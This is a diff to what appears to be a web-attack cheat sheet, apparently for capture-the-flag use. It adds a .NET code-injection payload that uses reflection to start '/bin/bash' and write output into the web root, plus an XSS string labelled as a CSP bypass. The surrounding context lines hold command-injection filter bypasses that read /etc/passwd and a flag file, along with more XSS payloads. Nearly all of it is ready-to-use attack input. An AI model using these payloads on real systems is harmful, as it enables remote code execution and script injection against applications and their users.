@@ -14,6 +14,7 @@ Table of Contents
     * [Bypass disable\_functions](#disable_functions繞過)
 *  [Command Injection](#command-injection)
     * [Bypass Space](#空白繞過)
+    * [Code injection dotnet](#Code injection dotnet)
     * [Bypass Keyword](#keyword繞過)
     * [ImageMagick](#imagemagick-imagetragick)
     * [Ruby Command Executing](#ruby-command-executing)
@@ -975,6 +976,10 @@ PS1=$(cat flag)
 - `X=$'cat\x20/etc/passwd'&&$X`
 - ``` IFS=,;`cat<<<uname,-a` ```
     - bash only
+
+## Code injection dotnet
+
+- ```") && "".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "/bin/bash;-c \"ls / > /app/src/wwwroot/output.txt\"".Split(";".ToCharArray())).GetType().ToString() == ("```
 
 
 ## Keyword繞過
@@ -3592,6 +3597,7 @@ require("./index.js")
 - `" onmouseover=alert(1) x="`
 - ``` `onmouseover=alert(1) x=` ```
 - `javascript:alert(1)//`
+- bypass scp: <script src="/**/alert(document.domain)//"></script>
 - ....
 
 ### 繞過
